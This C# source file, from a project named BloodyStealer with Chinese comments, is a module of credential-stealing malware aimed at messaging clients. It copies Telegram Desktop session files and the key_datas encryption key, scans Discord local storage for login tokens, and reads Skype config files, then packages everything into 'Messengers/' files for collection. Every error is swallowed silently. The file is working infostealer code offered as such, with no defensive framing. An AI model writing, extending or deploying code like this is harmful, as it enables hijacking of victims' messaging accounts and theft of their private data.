using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace BloodyStealer
{
    /// <summary>
    /// 即时通讯软件数据窃取 - 从各种即时通讯客户端窃取账号和聊天记录
    /// </summary>
    internal static class MessengerStealer
    {
        #region 统计计数器

        /// <summary>
        /// Telegram数据数量
        /// 原始代码: Telegram.Count
        /// </summary>
        public static int TelegramCount { get; private set; } = 0;

        /// <summary>
        /// Discord数据数量
        /// </summary>
        public static int DiscordCount { get; private set; } = 0;

        /// <summary>
        /// Skype数据数量
        /// </summary>
        public static int SkypeCount { get; private set; } = 0;

        #endregion

        /// <summary>
        /// 收集所有即时通讯客户端数据
        /// </summary>
        /// <returns>窃取的即时通讯客户端数据列表</returns>
        public static List<FileObject> CollectAllMessengerData()
        {
            List<FileObject> messengerData = new List<FileObject>();

            // 收集Telegram数据
            try
            {
                List<FileObject> telegramData = GetTelegramData();
                if (telegramData.Count > 0)
                {
                    messengerData.AddRange(telegramData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集Discord数据
            try
            {
                FileObject discordData = GetDiscordData();
                if (discordData != null)
                {
                    messengerData.Add(discordData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集Skype数据
            try
            {
                FileObject skypeData = GetSkypeData();
                if (skypeData != null)
                {
                    messengerData.Add(skypeData);
                }
            }
            catch { /* 忽略错误 */ }

            return messengerData;
        }

        /// <summary>
        /// 获取Telegram客户端数据
        /// 原始代码: Telegram.cs
        /// </summary>
        /// <returns>包含Telegram数据的文件对象列表</returns>
        private static List<FileObject> GetTelegramData()
        {
            List<FileObject> result = new List<FileObject>();
            List<string> telegramPaths = new List<string>();

            try
            {
                // 查找Telegram安装目录
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                
                // 添加可能的Telegram数据路径
                telegramPaths.Add(Path.Combine(appData, "Telegram Desktop"));
                telegramPaths.Add(Path.Combine(localAppData, "Telegram Desktop"));
                
                foreach (string telegramPath in telegramPaths)
                {
                    if (Directory.Exists(telegramPath))
                    {
                        // 查找tdata目录（包含会话数据）
                        string tdataPath = Path.Combine(telegramPath, "tdata");
                        if (Directory.Exists(tdataPath))
                        {
                            // 统计D877F783D5D3EF8C等会话文件数量
                            int sessionFiles = Directory.GetFiles(tdataPath, "D*", SearchOption.TopDirectoryOnly).Length;
                            if (sessionFiles > 0)
                            {
                                TelegramCount++;
                            }
                            
                            // 先收集文本描述信息
                            StringBuilder infoBuilder = new StringBuilder();
                            infoBuilder.AppendLine("=== Telegram会话信息 ===");
                            infoBuilder.AppendLine($"数据路径: {tdataPath}");
                            infoBuilder.AppendLine($"会话文件数量: {sessionFiles}");
                            
                            // 查找地图缓存文件（可能包含位置信息）
                            string mapCachePath = Path.Combine(tdataPath, "map");
                            if (Directory.Exists(mapCachePath))
                            {
                                infoBuilder.AppendLine("发现地图缓存目录（可能包含位置信息）");
                            }
                            
                            // 创建信息文件
                            result.Add(new FileObject("Messengers/Telegram_Info.txt", infoBuilder.ToString()));
                            
                            // 复制关键配置文件
                            try
                            {
                                // key_datas文件（包含加密密钥）
                                string keyDatasFile = Path.Combine(tdataPath, "key_datas");
                                if (File.Exists(keyDatasFile))
                                {
                                    result.Add(new FileObject("Messengers/Telegram/key_datas", File.ReadAllBytes(keyDatasFile)));
                                }
                                
                                // 复制所有D开头的会话文件（限制数量）
                                string[] dFiles = Directory.GetFiles(tdataPath, "D*", SearchOption.TopDirectoryOnly);
                                int maxFiles = Math.Min(dFiles.Length, 20); // 限制最多20个文件
                                for (int i = 0; i < maxFiles; i++)
                                {
                                    string fileName = Path.GetFileName(dFiles[i]);
                                    result.Add(new FileObject($"Messengers/Telegram/{fileName}", File.ReadAllBytes(dFiles[i])));
                                }
                                
                                // maps.txt文件（可能包含位置数据）
                                string mapsFile = Path.Combine(tdataPath, "maps.txt");
                                if (File.Exists(mapsFile))
                                {
                                    result.Add(new FileObject("Messengers/Telegram/maps.txt", File.ReadAllBytes(mapsFile)));
                                }
                            }
                            catch (Exception ex)
                            {
                                // 创建错误报告
                                result.Add(new FileObject("Messengers/Telegram_Error.txt", ex.ToString()));
                            }
                        }
                    }
                }
            }
            catch
            {
                // 忽略总体错误
            }

            return result;
        }

        /// <summary>
        /// 获取Discord客户端数据
        /// </summary>
        /// <returns>包含Discord数据的文件对象</returns>
        private static FileObject GetDiscordData()
        {
            StringBuilder result = new StringBuilder();

            try
            {
                // Discord数据通常保存在AppData\Roaming\discord\Local Storage目录
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string discordPath = Path.Combine(appData, "discord");
                
                if (!Directory.Exists(discordPath))
                {
                    return null;
                }

                result.AppendLine("=== Discord账号信息 ===");
                result.AppendLine($"数据路径: {discordPath}");
                result.AppendLine();

                // 查找本地存储目录（包含令牌）
                string localStoragePath = Path.Combine(discordPath, "Local Storage", "leveldb");
                if (Directory.Exists(localStoragePath))
                {
                    result.AppendLine("本地存储目录:");
                    result.AppendLine(localStoragePath);
                    
                    // 检索所有.ldb文件（可能包含令牌）
                    string[] ldbFiles = Directory.GetFiles(localStoragePath, "*.ldb");
                    result.AppendLine($"找到 {ldbFiles.Length} 个数据库文件");
                    
                    // 扫描文件中的令牌（格式：mfa.XXXX或XXXX.XXXX.XXXX，"token"）
                    int tokenCount = 0;
                    foreach (string ldbFile in ldbFiles)
                    {
                        string content = File.ReadAllText(ldbFile);
                        if (content.Contains("\"token\"") || content.Contains("mfa."))
                        {
                            tokenCount++;
                            result.AppendLine($"在文件 {Path.GetFileName(ldbFile)} 中发现可能的令牌");
                        }
                    }
                    
                    DiscordCount = tokenCount;
                    result.AppendLine($"发现 {tokenCount} 个潜在令牌");
                    result.AppendLine();
                }

                // 查找设置文件
                string settingsPath = Path.Combine(discordPath, "settings.json");
                if (File.Exists(settingsPath))
                {
                    result.AppendLine("设置文件内容:");
                    result.AppendLine(File.ReadAllText(settingsPath));
                    result.AppendLine();
                }
            }
            catch
            {
                // 忽略错误
            }

            return new FileObject("Messengers/Discord.txt", result.ToString());
        }

        /// <summary>
        /// 获取Skype客户端数据
        /// </summary>
        /// <returns>包含Skype数据的文件对象</returns>
        private static FileObject GetSkypeData()
        {
            StringBuilder result = new StringBuilder();

            try
            {
                // Skype数据通常保存在AppData\Roaming\Skype目录
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string skypePath = Path.Combine(appData, "Skype");
                
                if (!Directory.Exists(skypePath))
                {
                    return null;
                }

                result.AppendLine("=== Skype账号信息 ===");
                result.AppendLine($"数据路径: {skypePath}");
                result.AppendLine();

                // 查找用户目录
                string[] userDirs = Directory.GetDirectories(skypePath);
                foreach (string userDir in userDirs)
                {
                    string userName = Path.GetFileName(userDir);
                    if (!userName.Equals("shared_dynco") && !userName.Equals("shared_httpfe"))
                    {
                        result.AppendLine($"用户: {userName}");
                        
                        // 查找配置文件
                        string configPath = Path.Combine(userDir, "config.xml");
                        if (File.Exists(configPath))
                        {
                            result.AppendLine("配置文件内容:");
                            result.AppendLine(File.ReadAllText(configPath));
                            
                            SkypeCount++;
                        }
                        
                        // 查找联系人数据库
                        string contactsDb = Path.Combine(userDir, "main.db");
                        if (File.Exists(contactsDb))
                        {
                            result.AppendLine("发现联系人数据库文件");
                        }
                        
                        result.AppendLine();
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return new FileObject("Messengers/Skype.txt", result.ToString());
        }
    }
} 